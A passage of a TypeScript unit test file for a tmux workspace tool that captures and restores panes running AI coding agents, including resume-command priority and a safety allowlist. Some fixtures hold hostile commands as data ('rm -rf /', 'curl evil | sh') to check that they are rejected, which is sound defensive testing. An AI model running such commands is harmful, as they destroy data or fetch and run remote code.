import { afterEach, describe, expect, test } from "bun:test";
import {
  mkdirSync,
  mkdtempSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import type { HookSnapshot, HookSummary } from "@spaces/types";
import type {
  DriverPane,
  DriverSession,
  DriverSnapshot,
  DriverWindow,
  MultiplexerDriver,
} from "../drivers/types";
import { SpacesStore, type ResurrectSpaceSnapshot } from "../store/db";
import {
  captureOpenState,
  captureSpaces,
  extractSessionIdFromArgs,
  harnessLaunchArgs,
  harnessProfileFromArgv,
  readChildCmdline,
  type HarnessResumePolicy,
} from "./capture";
import {
  agentBinaryName,
  agentResumeArgs,
  autoRestore,
  buildPaneCommand,
  isSingleEmptyShellSession,
  resolveAgentSessions,
  resolveRestoreCwd,
  restoreSpace,
  SPACES_RESTORED_OPTION,
  type VendorSessionLookup,
} from "./restore";

/**
 * Sample plugin policy fixture used in unit tests to verify the agent-agnostic
 * `HarnessResumePolicy` seam without hardcoding agent rules in `resurrect/`.
 */
const TEST_RESUME_POLICY: HarnessResumePolicy = {
  positionalResume: (agent) => agent === "codex" || agent === "muse",
  uniqueExplicitSessions: (agent) => agent === "codex",
  resumeArgs: (agent, sid) => {
    switch (agent) {
      case "claude":
      case "cursor-agent":
        return ["--resume", sid];
      case "codex":
      case "muse":
        return ["resume", sid];
      case "antigravity":
        return ["--conversation", sid];
      case "opencode":
      case "kilo":
      case "kimi":
      case "kimi-cli":
      case "deepseek":
        return ["--session", sid];
      default:
        return [];
    }
  },
};

const tempDirs: string[] = [];

function makeTempDir(prefix = "resurrect-test-"): string {
  const dir = mkdtempSync(path.join(os.tmpdir(), prefix));
  tempDirs.push(dir);
  return dir;
}

afterEach(() => {
  while (tempDirs.length > 0) {
    const dir = tempDirs.pop()!;
    rmSync(dir, { recursive: true, force: true });
  }
});

function makeSession(overrides: Partial<DriverSession> = {}): DriverSession {
  return {
    id: "$0",
    name: "work",
    attached: 1,
    createdAtSec: 1_700_000_000,
    windowCount: 1,
    worktreePath: "",
    worktreeName: "",
    worktreeBase: "",
    worktreeManaged: false,
    ...overrides,
  };
}

function makeWindow(overrides: Partial<DriverWindow> = {}): DriverWindow {
  return {
    sessionName: "work",
    id: "@1",
    index: 1,
    name: "code",
    active: true,
    last: false,
    zoomed: false,
    bell: false,
    activity: false,
    silence: false,
    width: 120,
    height: 40,
    activityAtSec: 0,
    layout: "",
    worktreePath: "",
    worktreeName: "",
    worktreeBase: "",
    worktreeManaged: false,
    ...overrides,
  };
}

function makePane(overrides: Partial<DriverPane> = {}): DriverPane {
  return {
    sessionName: "work",
    windowId: "@1",
    windowIndex: 1,
    windowName: "code",
    paneIndex: 1,
    id: "%1",
    numericId: 1,
    title: "",
    currentCommand: "",
    startCommand: "",
    currentPath: "/repo",
    pid: 0,
    width: 120,
    height: 40,
    active: true,
    windowActive: true,
    inMode: false,
    synchronized: false,
    dead: false,
    deadStatus: 0,
    bell: false,
    activity: false,
    silence: false,
    spacesState: "",
    spacesApp: "",
    spacesKind: "",
    spacesMsg: "",
    spacesTsMs: 0,
    spacesSource: "",
    spacesTitle: "",
    resumeSession: "",
    profile: "",
    launchCommand: [],
    ...overrides,
  };
}

function makeHookSummary(overrides: Partial<HookSummary> = {}): HookSummary {
  return {
    agent: "claude",
    app: "claude-code",
    state: "idle",
    kind: "",
    event: "stop",
    source: "hook",
    ts_ms: 1_700_000_000_000,
    state_since_ms: 1_700_000_000_000,
    turn_started_ms: 0,
    text: "",
    title: "",
    model: "",
    session_id: "",
    cwd: "/repo",
    usage: null,
    child_count: 0,
    background: 0,
    finite_active: 0,
    service_active: 0,
    waiting_on: "",
    children: [],
    background_tasks: [],
    has_detail: false,
    ...overrides,
  };
}

class FakeDriver implements MultiplexerDriver {
  readonly kind = "tmux" as const;
  ops: string[] = [];
  snap: DriverSnapshot = {
    sessions: [],
    windows: [],
    panes: [],
    currentSession: "",
    currentPaneId: "",
  };
  clientsPresent = false;
  globalOptions = new Map<string, string>();
  nextWin = 0;
  nextPane = 0;
  failRename = false;
  failSwitchClient = false;

  async serverRunning(): Promise<boolean> {
    return true;
  }
  async currentSession(): Promise<string> {
    return this.snap.currentSession;
  }
  async hasClients(): Promise<boolean> {
    return this.clientsPresent;
  }
  async listSessions(): Promise<DriverSession[]> {
    return this.snap.sessions;
  }
  async listWindows(): Promise<DriverWindow[]> {
    return this.snap.windows;
  }
  async listPanes(): Promise<DriverPane[]> {
    return this.snap.panes;
  }
  async snapshot(): Promise<DriverSnapshot> {
    return this.snap;
  }
  async capturePane(): Promise<string> {
    return "";
  }
  async capturePaneStyled(): Promise<string> {
    return "";
  }
  async switchToSpace(name: string): Promise<void> {
    this.ops.push(`switch:${name}`);
  }
  async switchClient(name: string): Promise<void> {
    if (this.failSwitchClient) {
      throw new Error("switchClient failed");
    }
    this.ops.push(`switch-client:${name}`);
  }
  async focusPane(session: string, windowId: string, paneId: string): Promise<void> {
    this.ops.push(`focus:${session}:${windowId}:${paneId}`);
  }
  async newSession(name: string, cwd: string): Promise<void> {
    this.ops.push(`new-session-simple:${name}:${cwd}`);
  }
  async renameSession(oldName: string, newName: string): Promise<void> {
    if (this.failRename) {
      throw new Error("renameSession failed");
    }
    this.ops.push(`rename-session:${oldName}->${newName}`);
  }
  async killSession(name: string): Promise<void> {
    this.ops.push(`kill-session:${name}`);
  }
  async newWindow(
    session: string,
    cwd: string,
    name: string,
    command?: string[],
  ): Promise<void> {
    this.ops.push(`new-window:${session}:${cwd}:${name}:${(command ?? []).join(" ")}`);
  }
  async newWindowReturningId(
    session: string,
    cwd: string,
    name: string,
    command?: string[],
  ): Promise<string> {
    this.nextWin += 1;
    const winId = `@${this.nextWin}`;
    this.ops.push(`new-window-ret:${session}:${cwd}:${name}:${(command ?? []).join(" ")}=${winId}`);
    return winId;
  }
  async renameWindow(target: string, newName: string): Promise<void> {
    this.ops.push(`rename-window:${target}:${newName}`);
  }
  async killWindow(target: string): Promise<void> {
    this.ops.push(`kill-window:${target}`);
  }
  async setPaneOption(paneId: string, option: string, value: string): Promise<void> {
    this.ops.push(`set-pane-opt:${paneId}:${option}=${value}`);
  }
  async unsetPaneOption(paneId: string, option: string): Promise<void> {
    this.ops.push(`unset-pane-opt:${paneId}:${option}`);
  }
  async setSpacesStatus(
    paneId: string,
    state: string,
    app: string,
    kind: string,
    msg: string,
    tsMs: number,
  ): Promise<void> {
    this.ops.push(`set-spaces-status:${paneId}:${state}:${app}:${kind}:${msg}:${tsMs}`);
  }
  async setWindowOption(windowId: string, option: string, value: string): Promise<void> {
    this.ops.push(`set-win-opt:${windowId}:${option}=${value}`);
  }
  async setSessionOption(session: string, option: string, value: string): Promise<void> {
    this.ops.push(`set-sess-opt:${session}:${option}=${value}`);
  }
  async getGlobalOption(option: string): Promise<string> {
    return this.globalOptions.get(option) ?? "";
  }
  async setGlobalOption(option: string, value: string): Promise<void> {
    this.globalOptions.set(option, value);
    this.ops.push(`set-global-opt:${option}=${value}`);
  }
  async newSessionDetached(
    name: string,
    cwd: string,
    windowName: string,
    command?: string[],
  ): Promise<void> {
    this.ops.push(`new-session:${name}:${cwd}:${windowName}:${(command ?? []).join(" ")}`);
  }
  async newSessionDetachedWithId(
    name: string,
    cwd: string,
    windowName: string,
    width: number,
    height: number,
    command?: string[],
  ): Promise<{ windowId: string; paneId: string }> {
    this.nextWin += 1;
    this.nextPane += 1;
    const windowId = `@${this.nextWin}`;
    const paneId = `%${this.nextPane}`;
    this.ops.push(
      `new-session-id:${name}:${cwd}:${windowName}:${width}x${height}:${(command ?? []).join(" ")}=${windowId},${paneId}`,
    );
    return { windowId, paneId };
  }
  async newWindowDetachedWithId(
    session: string,
    cwd: string,
    name: string,
    command?: string[],
  ): Promise<{ windowId: string; paneId: string }> {
    this.nextWin += 1;
    this.nextPane += 1;
    const windowId = `@${this.nextWin}`;
    const paneId = `%${this.nextPane}`;
    this.ops.push(
      `new-window-id:${session}:${cwd}:${name}:${(command ?? []).join(" ")}=${windowId},${paneId}`,
    );
    return { windowId, paneId };
  }
  async splitWindow(target: string, cwd: string, command?: string[]): Promise<void> {
    this.ops.push(`split:${target}:${cwd}:${(command ?? []).join(" ")}`);
  }
  async splitWindowWithId(target: string, cwd: string, command?: string[]): Promise<string> {
    this.nextPane += 1;
    const paneId = `%${this.nextPane}`;
    this.ops.push(`split-id:${target}:${cwd}:${(command ?? []).join(" ")}=${paneId}`);
    return paneId;
  }
  async selectLayout(target: string, layout: string): Promise<void> {
    this.ops.push(`layout:${target}:${layout}`);
  }
  async selectWindow(target: string): Promise<void> {
    this.ops.push(`select-win:${target}`);
  }
  async selectPane(target: string): Promise<void> {
    this.ops.push(`select-pane:${target}`);
  }
  async resizePaneZoom(target: string): Promise<void> {
    this.ops.push(`zoom:${target}`);
  }
}

describe("extractSessionIdFromArgs & harness launchers", () => {
  test("extracts --conversation, --resume, --session, --id and skips latest / flags", () => {
    expect(extractSessionIdFromArgs("antigravity", ["agy", "--conversation", "conv-1"])).toBe(
      "conv-1",
    );
    expect(extractSessionIdFromArgs("antigravity", ["agy", "--conversation=conv-2"])).toBe(
      "conv-2",
    );
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume", "s-1"])).toBe("s-1");
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume=s-2"])).toBe("s-2");
    expect(extractSessionIdFromArgs("opencode", ["opencode", "--session", "oc-1"])).toBe("oc-1");
    expect(extractSessionIdFromArgs("opencode", ["opencode", "--session=oc-2"])).toBe("oc-2");
    expect(extractSessionIdFromArgs("kimi", ["kimi", "--id", "k-1"])).toBe("k-1");
    expect(extractSessionIdFromArgs("kimi", ["kimi", "--id=k-2"])).toBe("k-2");

    // Skips "latest" and "-*" values, continuing to later valid flags
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume", "latest"])).toBe("");
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume=latest"])).toBe("");
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume", "--continue"])).toBe("");
    expect(extractSessionIdFromArgs("claude", ["claude", "--resume=-bad"])).toBe("");
    expect(
      extractSessionIdFromArgs("claude", ["claude", "--resume", "--session", "valid-id"]),
    ).toBe("valid-id");

    // Positional `resume <id>` only when enabled by plugin policy, skipping --last and -*
    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "cx-1"], true)).toBe("cx-1");
    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "--last"], true)).toBe("");
    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "-q"], true)).toBe("");
    expect(extractSessionIdFromArgs("muse", ["muse", "resume", "mu-1"], true)).toBe("mu-1");

    // Disabled by default (agent-agnostic)
    expect(extractSessionIdFromArgs("claude", ["claude", "resume", "not-a-flag"])).toBe("");
    expect(extractSessionIdFromArgs("codex", ["codex", "resume", "cx-1"])).toBe("");
  });

  test("harnessLaunchArgs & harnessProfileFromArgv recognize spaces, tmux-spaces, harness, __resume-access", () => {
    expect(harnessLaunchArgs(["spaces", "claude", "profile", "work"])).toEqual({
      ok: true,
      level: "",
      args: ["claude", "profile", "work"],
    });
    expect(harnessLaunchArgs(["/usr/bin/tmux-spaces", "profile", "ops"])).toEqual({
      ok: true,
      level: "",
      args: ["profile", "ops"],
    });
    expect(harnessLaunchArgs(["harness", "launch", "codex"])).toEqual({
      ok: true,
      level: "",
      args: ["launch", "codex"],
    });
    expect(
      harnessLaunchArgs([
        "/bin/tmux-spaces",
        "__resume-access",
        "sandboxed",
        "agy",
        "profile",
        "saucerf166",
      ]),
    ).toEqual({
      ok: true,
      level: "sandboxed",
      args: ["agy", "profile", "saucerf166"],
    });
    expect(harnessLaunchArgs(["claude", "--resume", "s-1"])).toEqual({
      ok: false,
      level: "",
      args: [],
    });

    expect(harnessProfileFromArgv(["spaces", "antigravity", "profile", "work"])).toBe("work");
    expect(harnessProfileFromArgv(["tmux-spaces", "__shim", "--profile", "p1", "claude"])).toBe(
      "p1",
    );
    expect(harnessProfileFromArgv(["tmux-spaces", "__shim", "--profile=p2", "claude"])).toBe("p2");
    expect(
      harnessProfileFromArgv(["harness", "spaces", "__shim-profile", "antigravity/p3"]),
    ).toBe("p3");
    expect(harnessProfileFromArgv(["/bin/tmux-spaces", "__resume-access", "", "codex", "profile", "p4"])).toBe("p4");
    expect(harnessProfileFromArgv(["claude", "--profile", "ignored"])).toBe("");
  });
});

describe("/proc inspection helpers", () => {
  test("readChildCmdline walks /proc/<pid>/task/*/children up to depth 6 and stops on agent/harness", () => {
    const procRoot = makeTempDir("mock-proc-");

    const addProc = (pid: number, children: number[], argv: string[]) => {
      const pDir = path.join(procRoot, String(pid));
      mkdirSync(path.join(pDir, "task", String(pid)), { recursive: true });
      writeFileSync(path.join(pDir, "task", String(pid), "children"), children.join(" "));
      writeFileSync(path.join(pDir, "cmdline"), argv.join("\0") + "\0");
    };

    // Tree: 100 (zsh) -> 101 (spaces claude profile work) -> 102 (node claude.js)
    addProc(100, [101], ["zsh"]);
    addProc(101, [102], ["/usr/local/bin/spaces", "claude", "profile", "work"]);
    addProc(102, [], ["node", "/opt/claude/cli.js"]);
    expect(readChildCmdline(100, procRoot)).toEqual([
      "/usr/local/bin/spaces",
      "claude",
      "profile",
      "work",
    ]);

    // Tree stopping on direct known agent: 200 -> 201 (env) -> 202 (/usr/bin/codex) -> 203 (child)
    addProc(200, [201], ["zsh"]);
    addProc(201, [202], ["env", "FOO=1"]);
    addProc(202, [203], ["/usr/bin/codex", "resume", "cx-7"]);
    addProc(203, [], ["sleep", "10"]);
    expect(readChildCmdline(200, procRoot)).toEqual(["/usr/bin/codex", "resume", "cx-7"]);

    // Non-agent tree keeps deepest cmdline within depth 6: 300 -> 301 (nvim main.ts)
    addProc(300, [301], ["zsh"]);
    addProc(301, [], ["nvim", "main.ts"]);
    expect(readChildCmdline(300, procRoot)).toEqual(["nvim", "main.ts"]);
  });
});

describe("6-tier resume priority chain & captureSpaces", () => {
  test("enforces Tier 1 OSC 7577 > Tier 2 @spaces_resume_session > Tier 3 hooks > Tier 4 CLI > Tier 5 live", () => {
    const store = new SpacesStore(":memory:");
    const nowMs = 1_700_000_050_000;

    // Tier 1 hint on %1 overrides agent, session_id, profile, cwd fallback, and full_command
    store.upsertVerifiedResumeHint({
      pane_id: "%1",
      agent: "claude-code",
      session_id: "tier1-osc",
      profile: "osc-profile",
      cwd: "/osc/fallback-cwd",
      resume_cmd: ["claude", "--resume", "tier1-osc"],
      signature_hex: "aa".repeat(32),
      verified_at_ms: nowMs,
    });

    // Unsafe Tier 1 resume_cmd on %1b must be rejected while safe session_id still applies
    store.upsertVerifiedResumeHint({
      pane_id: "%6",
      agent: "claude",
      session_id: "tier1-safe-sid",
      resume_cmd: ["sh", "-c", "rm -rf /"],
      signature_hex: "bb".repeat(32),
      verified_at_ms: nowMs,
    });

    // Stale Tier 1 hint on %7 (pane returned to interactive zsh) must be skipped
    store.upsertVerifiedResumeHint({
      pane_id: "%7",
      agent: "claude",
      session_id: "stale-osc",
      resume_cmd: ["claude", "--resume", "stale-osc"],
      signature_hex: "cc".repeat(32),
      verified_at_ms: nowMs,
    });

    const hooks: HookSnapshot = {
      ok: true,
      version: 1,
      now_ms: nowMs,
      spool_pending: 0,
      panes: {
        work: {
          "1": makeHookSummary({ agent: "codex", session_id: "tier3-hook" }),
          "2": makeHookSummary({ agent: "claude", session_id: "tier3-hook-2" }),
          "3": makeHookSummary({ agent: "claude", session_id: "tier3-hook-win" }),
          "7": makeHookSummary({ agent: "claude", session_id: "stale-hook" }),
        },
      },
      outcomes: [],
    };

    const snap: DriverSnapshot = {
      currentSession: "work",
      currentPaneId: "%1",
      sessions: [
        makeSession({
          name: "work",
          worktreePath: "/wt/feat-a",
          worktreeName: "feat-a",
          worktreeBase: "main",
        }),
      ],
      windows: [makeWindow({ sessionName: "work", id: "@1", index: 1, name: "agents", active: true })],
      panes: [
        // %1: Tier 1 OSC 7577 beats Tier 2/3/4/5, overrides /proc & @spaces_launch_cmd, uses hint.cwd when currentPath=""
        makePane({
          id: "%1",
          numericId: 1,
          paneIndex: 1,
          currentPath: "",
          currentCommand: "claude",
          spacesApp: "codex",
          resumeSession: "tier2-resume-opt",
          profile: "pane-prof",
          launchCommand: ["/bin/tmux-spaces", "__resume-access", "auto", "claude"],
          pid: 101,
          active: true,
        }),
        // %2: No Tier 1 -> Tier 2 @spaces_resume_session beats Tier 3/4/5
        makePane({
          id: "%2",
          numericId: 2,
          paneIndex: 2,
          currentCommand: "claude",
          spacesApp: "claude-code",
          resumeSession: "tier2-win",
          pid: 102,
          active: false,
        }),
        // %3: No Tier 1/2 -> Tier 3 Hook beats Tier 4/5
        makePane({
          id: "%3",
          numericId: 3,
          paneIndex: 3,
          currentCommand: "claude",
          spacesApp: "claude",
          pid: 103,
          active: false,
        }),
        // %4: No Tier 1/2/3 -> Tier 4 CLI flag beats Tier 5
        makePane({
          id: "%4",
          numericId: 4,
          paneIndex: 4,
          currentCommand: "tmux-spaces",
          spacesApp: "antigravity",
          spacesTitle: "CLI title",
          pid: 104,
          active: false,
        }),
        // %5: No Tier 1/2/3/4 -> Tier 5 live FD discovery
        makePane({
          id: "%5",
          numericId: 5,
          paneIndex: 5,
          currentCommand: "tmux-spaces",
          spacesApp: "antigravity",
          pid: 105,
          active: false,
        }),
        // %6: Unsafe OSC 7577 resume_cmd is rejected; /proc cmdline preserved
        makePane({
          id: "%6",
          numericId: 6,
          paneIndex: 6,
          currentCommand: "claude",
          spacesApp: "claude",
          pid: 106,
          active: false,
        }),
        // %7: Pane returned to interactive shell -> Tier 1 OSC 7577 & stale hook skipped
        makePane({
          id: "%7",
          numericId: 7,
          paneIndex: 7,
          currentCommand: "zsh",
          spacesApp: "claude",
          spacesSource: "osc7501",
          resumeSession: "stale-resume",
          pid: 107,
          active: false,
        }),
        // %8: Live agent inside subshell (currentCommand="zsh" but /proc child is claude) -> Tier 1 hint IS applied
        makePane({
          id: "%8",
          numericId: 8,
          paneIndex: 8,
          currentCommand: "zsh",
          pid: 108,
          active: false,
        }),
      ],
    };

    store.upsertVerifiedResumeHint({
      pane_id: "%8",
      agent: "claude",
      session_id: "subshell-osc",
      resume_cmd: ["claude", "--resume", "subshell-osc"],
      signature_hex: "dd".repeat(32),
      verified_at_ms: nowMs,
    });

    const captured = captureSpaces(snap, hooks, store, {
      nowMs,
      discoverMainRepoRoot: (wt) => (wt === "/wt/feat-a" ? "/repos/main" : ""),
      readChildCmdline: (pid) => {
        switch (pid) {
          case 101:
            return ["claude", "--resume", "tier4-proc"];
          case 103:
            return ["claude", "--resume", "tier4-flag"];
          case 104:
            return ["harness", "agy", "profile", "saucerf166", "--conversation", "tier4-agy"];
          case 105:
            return ["harness", "agy", "profile", "saucerf166"];
          case 106:
            return ["claude", "--dangerously-skip-permissions"];
          case 107:
            return [];
          case 108:
            return ["claude", "--resume", "proc-subshell"];
          default:
            return [];
        }
      },
      discoverLiveSessionId: (agent, pid) => {
        if (agent === "antigravity" && pid === 104) return "tier5-should-not-win";
        if (agent === "antigravity" && pid === 105) return "tier5-live-agy";
        return "";
      },
    });

    expect(captured).toHaveLength(1);
    const space = captured[0]!;
    expect(space.main_repo_root).toBe("/repos/main");
    expect(space.worktree_path).toBe("/wt/feat-a");
    expect(space.cwd).toBe("/osc/fallback-cwd");

    const panes = space.windows[0]!.panes;
    expect(panes[0]).toMatchObject({
      agent: "claude",
      session_id: "tier1-osc",
      profile: "osc-profile",
      cwd: "/osc/fallback-cwd",
      full_command: ["claude", "--resume", "tier1-osc"],
    });
    expect(panes[1]?.session_id).toBe("tier2-win");
    expect(panes[2]?.session_id).toBe("tier3-hook-win");
    expect(panes[3]).toMatchObject({
      agent: "antigravity",
      session_id: "tier4-agy",
      profile: "saucerf166",
      title: "CLI title",
    });
    expect(panes[4]).toMatchObject({
      agent: "antigravity",
      session_id: "tier5-live-agy",
      profile: "saucerf166",
    });
    // Unsafe OSC 7577 resume_cmd was rejected -> fell back to /proc cmdline
    expect(panes[5]?.session_id).toBe("tier1-safe-sid");
    expect(panes[5]?.full_command).toEqual(["claude", "--dangerously-skip-permissions"]);
    // Returned-to-shell pane did NOT resurrect via stale OSC 7577 or stale hook
    expect(panes[6]?.agent).toBeUndefined();
    expect(panes[6]?.session_id).toBeUndefined();
    expect(panes[6]?.full_command).toBeUndefined();
    // Subshell pane with live claude child kept OSC 7577 hint
    expect(panes[7]).toMatchObject({
      agent: "claude",
      session_id: "subshell-osc",
      full_command: ["claude", "--resume", "subshell-osc"],
    });

    store.close();
  });

  test("rejects unallowlisted non-agent OSC 7577 resume_cmd while allowing SAFE_RESTORE_COMMANDS", () => {
    const store = new SpacesStore(":memory:");
    const nowMs = 1_700_000_060_000;

    store.upsertVerifiedResumeHint({
      pane_id: "%1",
      agent: "",
      session_id: "",
      resume_cmd: ["rm", "-rf", "/tmp/evil"],
      signature_hex: "11".repeat(32),
      verified_at_ms: nowMs,
    });
    store.upsertVerifiedResumeHint({
      pane_id: "%2",
      agent: "",
      session_id: "",
      resume_cmd: ["nvim", "README.md"],
      signature_hex: "22".repeat(32),
      verified_at_ms: nowMs,
    });

    const snap: DriverSnapshot = {
      currentSession: "work",
      currentPaneId: "%1",
      sessions: [makeSession({ name: "work" })],
      windows: [makeWindow({ sessionName: "work", id: "@1", index: 1, name: "tools" })],
      panes: [
        makePane({ id: "%1", numericId: 1, paneIndex: 1, currentCommand: "rm" }),
        makePane({ id: "%2", numericId: 2, paneIndex: 2, currentCommand: "nvim" }),
      ],
    };

    const captured = captureSpaces(snap, null, store, { nowMs });
    expect(captured[0]!.windows[0]!.panes[0]!.full_command).toBeUndefined();
    expect(captured[0]!.windows[0]!.panes[1]!.full_command).toEqual(["nvim", "README.md"]);
    store.close();
  });

  test("captureOpenState orders sessions by createdAtSec/id/name and falls back active session", () => {
    const snap: DriverSnapshot = {
      currentSession: "second",
      currentPaneId: "%1",
      sessions: [
        makeSession({ id: "$2", name: "third", createdAtSec: 200, attached: 0 }),
        makeSession({ id: "$0", name: "first", createdAtSec: 100, attached: 0 }),
        makeSession({ id: "$1", name: "second", createdAtSec: 150, attached: 1 }),
      ],
      windows: [],
      panes: [],
    };
    const st1 = captureOpenState(snap, 1_700_000_100_000);
    expect(st1.spaces).toEqual(["first", "second", "third"]);
    expect(st1.active_session).toBe("second");
    expect(st1.saved_at_ms).toBe(1_700_000_100_000);

    // Falls back to first attached session when currentSession is empty/missing
    const st2 = captureOpenState({ ...snap, currentSession: "" }, 1_700_000_100_000);
    expect(st2.active_session).toBe("second");

    // Falls back to first session when none attached
    const st3 = captureOpenState(
      {
        ...snap,
        currentSession: "",
        sessions: snap.sessions.map((s) => ({ ...s, attached: 0 })),
      },
      1_700_000_100_000,
    );
    expect(st3.active_session).toBe("first");
  });
});

describe("agentBinaryName, agentResumeArgs, resolveAgentSessions & buildPaneCommand", () => {
  test("maps binary names and delegates native resume args to HarnessResumePolicy", () => {
    expect(agentBinaryName("cursor")).toBe("cursor-agent");
    expect(agentBinaryName("claude-code")).toBe("claude");
    expect(agentBinaryName("agy")).toBe("antigravity");

    // Agent-agnostic by default when no HarnessResumePolicy is provided
    expect(agentResumeArgs("claude", "s1")).toEqual([]);
    expect(agentResumeArgs("codex", "s1")).toEqual([]);

    expect(agentResumeArgs("claude", "s1", TEST_RESUME_POLICY)).toEqual(["--resume", "s1"]);
    expect(agentResumeArgs("codex", "s1", TEST_RESUME_POLICY)).toEqual(["resume", "s1"]);
    expect(agentResumeArgs("opencode", "s1", TEST_RESUME_POLICY)).toEqual(["--session", "s1"]);
    expect(agentResumeArgs("antigravity", "s1", TEST_RESUME_POLICY)).toEqual([
      "--conversation",
      "s1",
    ]);
    expect(agentResumeArgs("claude", "", TEST_RESUME_POLICY)).toEqual([]);
  });

  test("resolveAgentSessions handles Tier 6 vendor store deduplication, skipResume, and Codex duplicate-pane shell fallback", () => {
    const pools: Record<string, string[]> = {
      claude: ["claude-older", "claude-newest"],
      antigravity: ["agy-1"],
    };
    const lookup: VendorSessionLookup = (agent, _cwd, _profile, _title, exclude) => {
      const list = pools[agent] ?? [];
      for (const id of list) {
        if (!exclude.has(id)) {
          return { sessionId: id, storeAvailable: true };
        }
      }
      return { sessionId: "", storeAvailable: true };
    };

    const snap: ResurrectSpaceSnapshot = {
      name: "multi",
      cwd: "/repo",
      windows: [
        {
          index: 1,
          name: "claude",
          active: true,
          panes: [
            { index: 1, active: true, agent: "claude", full_command: ["claude", "--resume", "claude-older"] },
            { index: 2, active: false, agent: "claude", full_command: ["claude"] },
            { index: 3, active: false, agent: "claude", full_command: ["claude"] },
          ],
        },
        {
          index: 2,
          name: "codex",
          active: false,
          panes: [
            { index: 1, active: false, agent: "codex", session_id: "same-thread" },
            { index: 2, active: false, agent: "codex", full_command: ["codex", "resume", "same-thread"] },
          ],
        },
        {
          index: 3,
          name: "agy",
          active: false,
          panes: [
            { index: 1, active: false, agent: "antigravity" },
            { index: 2, active: false, agent: "antigravity" },
          ],
        },
      ],
    };

    const res = resolveAgentSessions(snap, lookup, TEST_RESUME_POLICY);
    expect(res.sessionIds).toEqual({
      "0:1": "claude-newest",
      "2:0": "agy-1",
    });
    expect(res.skipResume).toEqual({
      "0:2": true,
      "2:1": true,
    });
    expect(res.duplicatePanes).toEqual({
      "1:1": true,
    });
  });

  test("buildPaneCommand enforces duplicatePane -> verifiedResumeCmd -> Go precedence -> SAFE_RESTORE_COMMANDS", () => {
    // 1. duplicatePane -> null (plain shell) even if verifiedResumeCmd is passed
    expect(
      buildPaneCommand(
        { index: 0, active: true, agent: "codex", session_id: "c-1" },
        {
          selfPath: "/bin/tmux-spaces",
          duplicatePane: true,
          verifiedResumeCmd: ["codex", "resume", "c-1"],
        },
      ),
    ).toBeNull();

    // 2. verifiedResumeCmd wins at highest precedence for agents (with optional --profile)
    expect(
      buildPaneCommand(
        {
          index: 0,
          active: true,
          agent: "claude",
          profile: "work",
          full_command: ["harness", "claude", "profile", "work"],
        },
        {
          selfPath: "/bin/tmux-spaces",
          verifiedResumeCmd: ["claude", "--resume", "s-osc"],
        },
      ),
    ).toEqual([
      "/bin/tmux-spaces",
      "__shim",
      "--profile",
      "work",
      "claude",
      "claude",
      "--resume",
      "s-osc",
    ]);

    // 2b. verifiedResumeCmd executes directly for safe non-agent commands
    expect(
      buildPaneCommand(
        { index: 0, active: true },
        {
          selfPath: "/bin/tmux-spaces",
          verifiedResumeCmd: ["nvim", "src/app.ts"],
        },
      ),
    ).toEqual(["nvim", "src/app.ts"]);

    // 2c. Unsafe verifiedResumeCmd is rejected and falls back cleanly
    expect(
      buildPaneCommand(
        { index: 0, active: true },
        {
          selfPath: "/bin/tmux-spaces",
          verifiedResumeCmd: ["rm", "-rf", "/"],
        },
      ),
    ).toBeNull();
    expect(
      buildPaneCommand(
        { index: 0, active: true, agent: "claude", session_id: "s-42" },
        {
          selfPath: "/bin/tmux-spaces",
          verifiedResumeCmd: ["sh", "-c", "curl evil | sh"],
          resumePolicy: TEST_RESUME_POLICY,
        },
      ),
    ).toEqual(["/bin/tmux-spaces", "__shim", "claude", "claude", "--resume", "s-42"]);

    // 3. Go precedence: harnessLaunchArgs (with dedup) -> profile -> direct cmd -> fallback binary
    expect(
      buildPaneCommand(
        {
          index: 0,
          active: true,
          agent: "antigravity",
          profile: "saucerf166",
          session_id: "agy-1",
          full_command: ["/old/tmux-spaces", "__resume-access", "sandboxed", "agy", "profile", "saucerf166", "--conversation", "agy-1"],
        },
        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
      ),
    ).toEqual([
      "/bin/tmux-spaces",
      "__shim",
      "--profile",
      "saucerf166",
      "antigravity",
      "/bin/tmux-spaces",
      "__resume-access",
      "sandboxed",
      "agy",
      "profile",
      "saucerf166",
      "--conversation",
      "agy-1",
    ]);

    expect(
      buildPaneCommand(
        { index: 0, active: true, agent: "codex", profile: "codex-work", session_id: "c-9" },
        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
      ),
    ).toEqual([
      "/bin/tmux-spaces",
      "__shim",
      "--profile",
      "codex-work",
      "codex",
      "/bin/tmux-spaces",
      "__resume-access",
      "",
      "codex",
      "profile",
      "codex-work",
      "resume",
      "c-9",
    ]);

    expect(
      buildPaneCommand(
        {
          index: 0,
          active: true,
          agent: "claude",
          session_id: "s-42",
          full_command: ["claude", "--dangerously-skip-permissions"],
        },
        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
      ),
    ).toEqual([
      "/bin/tmux-spaces",
      "__shim",
      "claude",
      "claude",
      "--dangerously-skip-permissions",
      "--resume",
      "s-42",
    ]);

    expect(
      buildPaneCommand(
        { index: 0, active: true, agent: "claude", session_id: "s-42" },
        { selfPath: "/bin/tmux-spaces", skipResume: true, resumePolicy: TEST_RESUME_POLICY },
      ),
    ).toEqual(["/bin/tmux-spaces", "__shim", "claude", "claude"]);

    expect(
      buildPaneCommand(
        { index: 0, active: true, agent: "cursor", session_id: "cur-1" },
        { selfPath: "/bin/tmux-spaces", resumePolicy: TEST_RESUME_POLICY },
      ),
    ).toEqual([
      "/bin/tmux-spaces",
      "__shim",
      "cursor-agent",
      "cursor-agent",
      "--resume",
      "cur-1",
    ]);

    // 4. SAFE_RESTORE_COMMANDS allowlist vs arbitrary shell commands
    expect(
      buildPaneCommand({ index: 0, active: true, full_command: ["lazygit"] }),
    ).toEqual(["lazygit"]);
    expect(
      buildPaneCommand({ index: 0, active: true, full_command: ["bash", "-l"] }),
    ).toBeNull();
    expect(
      buildPaneCommand({ index: 0, active: true, full_command: ["rm", "-rf", "/tmp/x"] }),
    ).toBeNull();
